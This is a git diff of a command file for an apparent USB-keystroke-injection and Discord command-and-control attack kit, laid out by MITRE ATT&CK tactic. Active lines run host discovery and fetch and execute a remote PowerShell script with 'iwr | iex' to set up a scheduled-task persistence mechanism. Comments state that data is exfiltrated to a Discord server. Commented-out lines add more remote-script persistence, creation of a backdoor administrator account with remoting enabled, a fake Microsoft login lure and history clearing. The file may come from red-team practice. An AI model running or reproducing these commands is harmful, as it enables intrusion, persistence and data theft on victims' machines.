@@ -1,12 +1,36 @@
-##!!hostname
-##!!whoami
+##Resource Development, Initial Access, Execution conducted by RubberDucky
+##Exfiltration, Command and Control done by gitDiscordC2.ps1 - Data is exfiltrated to private discord server
+##Discovery----------------------------------------------------------------------------
+#T1083, T1057, T1082, T1007
+!!hostname
+!!whoami
 !!systeminfo
+!!ipconfig
 ##!!wmic wmic service get Name,DisplayName,State,StartMode,ProcessId /format:table
 ##!!wmic process get Name,ProcessId,ParentProcessId,Priority,CreationDate /format:table
-!!ipconfig
+##
+##Impact----------------------------------------------------------------------------
+##T1565 Data Manipulation
 ##New-Item -Path "C:\Users\Leonardo\Desktop\new.txt" -ItemType File -Force
 ##Add-Content -Path "C:\Users\Leonardo\Desktop\new.txt" -Value "this is a file"
+##T1486 Data Encrypted for Impact
+##CODE HERE
+##
+##Persistance----------------------------------------------------------------------------
+##T1547 Boot or Logon Autostart Execution
 ##!!iwr https://raw.githubusercontent.com/JH517/DuckyPico/refs/heads/main/persist.ps1 | iex
+##T1140 Deobfuscate/Decode Files or Information
+##!!iwr https://raw.githubusercontent.com/JH517/DuckyPico/refs/heads/main/persist2.ps1 | iex
+##T1053 Scheduled Task/Job
 !!iwr https://raw.githubusercontent.com/JH517/DuckyPico/refs/heads/main/schedtsk.ps1 | iex
+##T1136 Create Account
+##New-LocalUser -Name "Username" -Password (ConvertTo-SecureString "Password" -AsPlainText -Force) -FullName "Full Name"; Add-LocalGroupMember -Group "Administrators" -Member "Username"; Enable-PSRemoting -Force
+##
+##Lateral Movement----------------------------------------------------------------------------
+##T1534 Internal Spearphishing
 ##!!Start-Process chrome.exe '--new-window https://sharepointmaven.com/wp-content/uploads/2022/09/brandloginwindowmicrosoft3651.jpg' -WindowStyle Normal
+##
+##Defense Evasion----------------------------------------------------------------------------
+##T1070 Indicator Removal
+##Invoke-Expression -Command Clear-History
 ##!!quit
